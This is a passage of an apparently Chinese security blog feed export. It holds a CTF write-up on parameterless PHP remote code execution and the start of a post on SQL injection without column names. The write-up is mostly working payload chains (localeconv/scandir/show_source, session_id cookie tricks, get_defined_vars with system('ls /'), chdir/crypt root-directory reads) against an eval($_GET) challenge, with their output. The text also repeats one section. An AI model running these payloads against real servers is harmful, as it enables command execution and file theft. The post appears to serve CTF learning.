<span class=\"literal\">NULL</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;exp&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;exp&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class=\"line\">                @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;exp&#x27;</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;还差一点哦！&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;再好好想想！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t这里只需要关心第二层绕过，主要考点应该是这一层，也就是无参数 RCE。</p>\n<h1 id=\"1常规方法\"><a class=\"markdownIt-Anchor\" href=\"#1常规方法\">#</a> 1. 常规方法：</h1>\n<p>​\t通常情况下， 我们想要读取该目录的文件内容，那么，常规的方法就是如下，不过，先给一个 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=<span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">next</span>(<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">current</span>(<span class=\"title function_ invoke__\">localeconv</span>())))));</span><br></pre></td></tr></table></figure>\n<p>​\t首先，通过通过 localeconv () 来 ，返回一包含本地数字及货币格式信息的数组，又因为数组的第一项是 '.，因此可以通过 current () （返回数组中的单元，默认取第一个值）来获取数组中的第一个参数也就是那一个点：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//payload  \t\t\t?exp=var_dump(localeconv());</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output:</span></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">18</span>) &#123; [<span class=\"string\">&quot;decimal_point&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">1</span>) <span class=\"string\">&quot;.&quot;</span> [<span class=\"string\">&quot;thousands_sep&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;int_curr_symbol&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;currency_symbol&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;mon_decimal_point&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;mon_thousands_sep&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;positive_sign&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;negative_sign&quot;</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">0</span>) <span class=\"string\">&quot;&quot;</span> [<span class=\"string\">&quot;int_frac_digits&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;frac_digits&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;p_cs_precedes&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;p_sep_by_space&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;n_cs_precedes&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;n_sep_by_space&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;p_sign_posn&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;n_sign_posn&quot;</span>]=&gt; <span class=\"keyword\">int</span>(<span class=\"number\">127</span>) [<span class=\"string\">&quot;grouping&quot;</span>]=&gt; <span class=\"keyword\">array</span>(<span class=\"number\">0</span>) &#123; &#125; [<span class=\"string\">&quot;mon_grouping&quot;</span>]=&gt; <span class=\"keyword\">array</span>(<span class=\"number\">0</span>) &#123; &#125; &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//payload = \t\t?exp=var_dump(current(localeconv()));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output  </span></span><br><span class=\"line\"><span class=\"keyword\">string</span>(<span class=\"number\">1</span>) <span class=\"string\">&quot;.&quot;</span></span><br></pre></td></tr></table></figure>\n<p>​\t之后，通过 scandir () 返回当前目录中的所有文件和目录的列表：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//paylaod\t\t\t?exp=var_dump(scandir(current(localeconv())));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output:</span></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">5</span>) &#123; [<span class=\"number\">0</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">1</span>) <span class=\"string\">&quot;.&quot;</span> [<span class=\"number\">1</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">2</span>) <span class=\"string\">&quot;..&quot;</span> [<span class=\"number\">2</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">4</span>) <span class=\"string\">&quot;.git&quot;</span> [<span class=\"number\">3</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">8</span>) <span class=\"string\">&quot;flag.php&quot;</span> [<span class=\"number\">4</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">9</span>) <span class=\"string\">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t刚好，这个题目稍微凑巧了，flag 文件刚好在倒数第二个文件中，因此可以使用 array_reverse () 来反转这个数组：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//paylaod\t\t\t?exp=var_dump(array_reverse(scandir(current(localeconv()))));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output:</span></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">5</span>) &#123; [<span class=\"number\">0</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">9</span>) <span class=\"string\">&quot;index.php&quot;</span> [<span class=\"number\">1</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">8</span>) <span class=\"string\">&quot;flag.php&quot;</span> [<span class=\"number\">2</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">4</span>) <span class=\"string\">&quot;.git&quot;</span> [<span class=\"number\">3</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">2</span>) <span class=\"string\">&quot;..&quot;</span> [<span class=\"number\">4</span>]=&gt; <span class=\"keyword\">string</span>(<span class=\"number\">1</span>) <span class=\"string\">&quot;.&quot;</span> &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t之后，通过 next () 来操作指针，指向 flag 文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//paylaod\t\t\t?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output:</span></span><br><span class=\"line\"><span class=\"keyword\">string</span>(<span class=\"number\">8</span>) <span class=\"string\">&quot;flag.php&quot;</span></span><br></pre></td></tr></table></figure>\n<p>​\t之后就可以通过 highlight_file () 来读取 flag 文件的内容了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//paylaod\t\t\t?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//output:</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;NSSCTF&#123;fe7192e9-edcb-4217-9bcf-220940f8c20d&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h1 id=\"2session_id\"><a class=\"markdownIt-Anchor\" href=\"#2session_id\">#</a> 2.session_id()</h1>\n<p>​\t使用条件：当请求头中有 cookie 时（或者走投无路手动添加 cookie 头也行，有些 CTF 题不会卡）</p>\n<p>​\t首先我们需要开启 session_start () 来保证 session_id () 的使用，session_id 可以用来获取当前会话 ID，也就是说它可以抓取 PHPSESSID 后面的东西，但是 phpsession 不允许 () 出现<br>\n​\t在 burp 中，构造一个 payload 为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=<span class=\"title function_ invoke__\">readfile</span>(<span class=\"title function_ invoke__\">session_id</span>(<span class=\"title function_ invoke__\">session_start</span>()));</span><br></pre></td></tr></table></figure>\n<p>​\t随后，将 Cookie 改为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPSESSID=flag.php </span><br></pre></td></tr></table></figure>\n<p>​\t最后成功读取到了 flag 文件</p>\n<h1 id=\"3getallheaders\"><a class=\"markdownIt-Anchor\" href=\"#3getallheaders\">#</a> 3.getallheaders()</h1>\n<p>​\tgetallheaders () 返回当前请求的所有请求头信息，局限于 Apache（apache_request_headers () 和 getallheaders () 功能相似，可互相替代，不过也是局限于 Apache）</p>\n<p>​\t当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用 end () 函数指向最后一个请求头，使其执行，payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=<span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">end</span>(<span class=\"title function_ invoke__\">getallheaders</span>()));</span><br></pre></td></tr></table></figure>\n<p>​\t不过，这个题目我用这个方法的时候失败了，因为第三层绕过过滤了 et，然后 get 单词存在被过滤单词，无法绕过，所以用一下别人的图片：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/8c3f2e46a74540bca932fdbf51cbb0e9.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"4get_defined_vars\"><a class=\"markdownIt-Anchor\" href=\"#4get_defined_vars\">#</a> 4.get_defined_vars()</h1>\n<p>​\t相较于 getallheaders（）更加具有普遍性，它可以回显全局变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mtext>、</mtext></mrow><annotation encoding=\"application/x-tex\">_GET、</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">、</span></span></span></span>_POST、<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>F</mi></msub><mi>I</mi><mi>L</mi><mi>E</mi><mi>S</mi><mtext>、</mtext></mrow><annotation encoding=\"application/x-tex\">_FILES、</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">F</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord cjk_fallback\">、</span></span></span></span>_COOKIE，</p>\n<p>返回数组顺序为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding=\"application/x-tex\">_GET--&gt;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span></span></span>_POST–&gt;<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>C</mi></msub><mi>O</mi><mi>O</mi><mi>K</mi><mi>I</mi><mi>E</mi><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding=\"application/x-tex\">_COOKIE--&gt;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">C</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span></span></span>_FILES</p>\n<p>​\t由于题目中过滤了</p>\n<p>​\t首先确认是否有回显：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">get_defined_vars</span>());</span><br></pre></td></tr></table></figure>\n<p>​\t假如说原本只有一个参数 a，那么可以多加一个参数 b，后面写入恶意语句，payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">end</span>(<span class=\"title function_ invoke__\">current</span>(<span class=\"title function_ invoke__\">get_defined_vars</span>())));&amp;b=<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t把 eval 换成 assert 也行 ，能执行 system (‘ls /’) 就行</p>\n<h1 id=\"5chdir\"><a class=\"markdownIt-Anchor\" href=\"#5chdir\">#</a> 5.chdir()</h1>\n<p>​\t实在无法 rce，可以考虑目录遍历进行文件读取，不过这里由于题目的过滤有点恶心人，所以只好记录一下方法了，有了机会再进行实践。</p>\n<p>​\t利用 <code>getcwd()</code>  获取当前目录：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">getcwd</span>());</span><br></pre></td></tr></table></figure>\n<p>​\t结合 dirname () 列出当前工作目录的父目录中的所有文件和目录:.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"title function_ invoke__\">getcwd</span>())));</span><br></pre></td></tr></table></figure>\n<p>​\t 读上一级文件名：</p>\n<blockquote>\n<p>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</p>\n<p>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</p>\n<p>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</p>\n</blockquote>\n<p>​\t读根目录:</p>\n<p>​\tord () 函数和 chr () 函数：只能对第一个字符进行转码，ord () 编码，chr) 解码，有概率会解码出斜杠读取根目录</p>\n<blockquote>\n<p>?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</p>\n</blockquote>\n<p>​\t要用 chdir () 固定，payload：</p>\n<blockquote>\n<p>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</p>\n</blockquote>\n<h1 id=\"6array_rand赌狗必备法\"><a class=\"markdownIt-Anchor\" href=\"#6array_rand赌狗必备法\">#</a> 6.array_rand ()# 赌狗必备法：</h1>\n<p>​\t首先，在这里吐槽一句，赌狗不值得同情 [doge]</p>\n<p>​\t可以通过 array_rand () 函数随机获取数组中的键，因此，需要提前将数组键值对翻转以下，让后再使用如下 payload 进行赌。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=<span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">array_rand</span>(<span class=\"title function_ invoke__\">array_flip</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">current</span>(<span class=\"title function_ invoke__\">localeconv</span>())))));</span><br></pre></td></tr></table></figure>\n<p>​\t因为这种很考验运气，因此，当目录中文件过多的情况下只有赌一把运气，可能一两下就出了，可能要花很长时间，因此，还是那句话，赌狗不值得同情 [doge]。</p>\n<p>​</p>\n<h1 id=\"参考资料\"><a class=\"markdownIt-Anchor\" href=\"#参考资料\">#</a> 参考资料：</h1>\n<p>​\t可以通过 array_rand () 函数随机获取数组中的键，因此，需要提前将数组键值对翻转以下，让后再使用如下 payload 进行赌。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=<span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">array_rand</span>(<span class=\"title function_ invoke__\">array_flip</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"title function_ invoke__\">current</span>(<span class=\"title function_ invoke__\">localeconv</span>())))));</span><br></pre></td></tr></table></figure>\n<p>​\t因为这种很考验运气，因此，当目录中文件过多的情况下只有赌一把运气，可能一两下就出了，可能要花很长时间，因此，还是那句话，赌狗不值得同情 [doge]。</p>\n<p>​</p>\n<h1 id=\"参考资料-2\"><a class=\"markdownIt-Anchor\" href=\"#参考资料-2\">#</a> 参考资料：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzIzMDFfNzY2OTA5MDUvYXJ0aWNsZS9kZXRhaWxzLzEzMzgwODUzNg==\">https://blog.csdn.net/2301_76690905/article/details/133808536</span></p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/384200ef.html",
            "url": "http://blog.g01den.top/posts/384200ef.html",
            "title": "SQL无列名注入",
            "date_published": "2024-03-03T11:10:34.000Z",
            "content_html": "<h1 id=\"sql无列名注入\"><a class=\"markdownIt-Anchor\" href=\"#sql无列名注入\">#</a> SQL 无列名注入</h1>\n<p>​\t前段时间，队里某位大佬发了一个关于 sql 注入无列名的文章，感觉好像很有用，特地研究下。</p>\n<h2 id=\"关于-information_schema-数据库\"><a class=\"markdownIt-Anchor\" href=\"#关于-information_schema-数据库\">#</a> 关于 information_schema 数据库：</h2>\n<p>​\t对于这一个库，我所知晓的内容并不多，并且之前总结 SQL 注入的时候忘记说这个数据库了，在这里补充一下，简单点儿来说，就是这个数据库中的某些表存放着数据库的一些信息，例如，我电脑中所有的数据库中存在如下的几个数据库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show databases;</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| Database           |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| mysql              |</span><br><span class=\"line\">| performance_schema |</span><br><span class=\"line\">| sakila             |</span><br><span class=\"line\">| sys                |</span><br><span class=\"line\">| test               |</span><br><span class=\"line\">| world              |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t那么我们通过查 information_schema 中的  SCHEMATA 表中的 SCHEMA_NAME 字段可以得到所有数据库的库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; use information_schema;</span><br><span class=\"line\">Database changed</span><br><span class=\"line\">mysql&gt; select SCHEMA_NAME from SCHEMATA;</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| SCHEMA_NAME        |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| mysql              |</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| performance_schema |</span><br><span class=\"line\">| sys                |</span><br><span class=\"line\">| sakila             |</span><br><span class=\"line\">| world              |</span><br><span class=\"line\">| test               |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t同时，tables 这个表中存在很多关于表的内容的字段，例如：</p>\n<p>​\t\t\ttable_schema，这个字段用于存放某张表属于哪一个数据库的字段。</p>\n<p>​\t\t\ttable_name， 这个字段用于存放所有的表的名字</p>\n<p>​\t如果想要查到某个数据库中的所有表名，则需要查询 table_name 这个字段，然后用 where 来限制 table_schema 查找对应的数据库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select table_name from TABLES where table_schema=&#x27;test&#x27;;</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| TABLE_NAME |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">| questions  |</span><br><span class=\"line\">+------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t另外，information_schema 库中还有一张 columns 表，这里面存的是所有字段的信息，columns 表中存在 table_name , table_schema , column_name 对于 table_schema，这里面则是所有字段所在表的名字，而 table_schema 则是存放了所有字段的表所在的数据库的名字，另外，column_name 则是存放了所有的字段的名字，因此，想要查询到某个数据库中所有字段的名字，或者某张表的所有的字段的名字则可以用如下的命令查找：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select column_name from columns where table_schema=&#x27;test&#x27;; #查询某个库里面所有的字段的名字</span><br><span class=\"line\">+-------------+</span><br><span class=\"line\">| COLUMN_NAME |</span><br><span 